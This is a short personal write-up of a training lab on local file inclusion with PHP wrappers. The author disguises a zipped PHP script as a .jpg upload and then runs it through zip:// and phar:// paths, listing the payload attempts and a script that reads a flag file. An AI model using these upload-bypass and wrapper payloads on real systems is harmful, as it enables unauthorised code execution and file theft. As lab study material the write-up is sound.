## lab 3 Local File Inclusion - Wrappers

- seems like an upload file lab 
- only jpg is allowed 
![[Pasted image 20251117141121.png]]
- so lets first write a script to list all current files in this directory i will use ai 

![[Pasted image 20251117141159.png]]

```
<?php
$files = scandir('.');

foreach ($files as $file) {
    if ($file !== '.' && $file !== '..') {
        echo htmlspecialchars($file) . "<br>\n";
    }
}
?>
```

# Lets try to bypass the upload function 
- first zip the php code 
![[Pasted image 20251117141400.png]]
- then rename it to jpg 
![[Pasted image 20251117141437.png]]
![[Pasted image 20251117141603.png]]
- upload success now lets find a wrapper func to excute it 

## Trying `zip://`Â wrapper.
- lets find out image path first 
![[Pasted image 20251117150533.png]]

```
zip://tmp/upload/0k6pvad9b.jpg  ERROR
zip://tmp/upload/0k6pvad9b.jpg#a.php  ERROR
zip://tmp/upload/0k6pvad9b.jpg%23a.php  Attack detected
zip://tmp/upload/0k6pvad9b.jpg%23file  page name too long
zip://tmp/upload/0k6pvad9b.jpg%23a  working
phar://tmp/upload/A7oW68SvR.jpg/a
```
![[Pasted image 20251117150229.png]]
- i will try to name it a or one letter 
![[Pasted image 20251117150711.png]]
## writing php script to get the flag 

```
<?php  
$flag=file_get_contents('flag-mipkBswUppqwXlq9ZydO.php');  
echo $flag;  
?>
```

## repeating same steps again and execute file name b this time 
![[Pasted image 20251117151629.png]]
![[Pasted image 20251117151653.png]]





